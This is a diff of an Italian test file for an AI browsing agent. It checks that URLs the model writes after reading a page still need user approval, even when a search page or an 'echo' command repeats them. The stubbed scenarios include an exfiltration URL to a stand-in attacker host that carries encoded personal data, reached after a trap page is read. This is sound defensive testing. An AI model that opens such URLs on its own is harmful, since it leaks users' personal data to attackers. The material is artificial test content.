@@ -944,6 +944,8 @@ test('dopo una pagina letta, un indirizzo scritto da Filo nella risposta resta s
 // Un indirizzo che il modello ha scritto resta suo anche quando una fonte lo ripete: la pagina dei risultati di una
 // ricerca che riporta le parole cercate, l'uscita di un comando (#553 giro 19).
 const RIPETUTO = 'https://attaccante.example/r?d=Znevb-Ebffv-Obybtan';
+// Il comando lo scrive senza schema: con lo schema è il comando stesso a chiedere l'OK, e non stampa niente (#2293).
+const STAMPA_RIPETUTO = `echo ${RIPETUTO.replace(/^https:\/\//, '')}`;
 async function siRipete(app) {
   await app.evaluate(() => {
     const prima = globalThis.SN_LETTURA_PAGINE._dip.scarica;
@@ -961,7 +963,7 @@ async function siRipete(app) {
 
 for (const [come, ripeti] of [
   ['dalla pagina dei risultati di una ricerca', { nome: 'LEGGI_PAGINA', args: { url: `https://it.wikipedia.org/w/index.php?search=${encodeURIComponent(RIPETUTO)}` } }],
-  ['dall\'uscita di un comando', { nome: 'ESEGUI_COMANDO', args: { comando: `echo ${RIPETUTO}` } }],
+  ['dall\'uscita di un comando', { nome: 'ESEGUI_COMANDO', args: { comando: STAMPA_RIPETUTO } }],
 ]) {
   test(`dopo una pagina letta, un indirizzo scritto dal modello e ripetuto ${come} chiede l'OK`, async ({ app, openTab }) => {
     test.setTimeout(60_000);
@@ -989,7 +991,7 @@ test('dopo una pagina letta, un indirizzo fatto stampare a un comando non apre u
   await stubModello(app, [
     { strumenti: [{ nome: 'CERCA_WEB', args: { query: 'trattorie bologna' } }] },
     { strumenti: [{ nome: 'LEGGI_PAGINA', args: { url: 'https://trappola.example/trattorie' } }] },
-    { strumenti: [{ nome: 'ESEGUI_COMANDO', args: { comando: `echo ${RIPETUTO}` } }] },
+    { strumenti: [{ nome: 'ESEGUI_COMANDO', args: { comando: STAMPA_RIPETUTO } }] },
     { strumenti: [{ nome: 'NAVIGA', args: { url: RIPETUTO, background: true } }] },
     { finale: { cerca: '(x)', testo: 'FATTO.' } },
   ]);
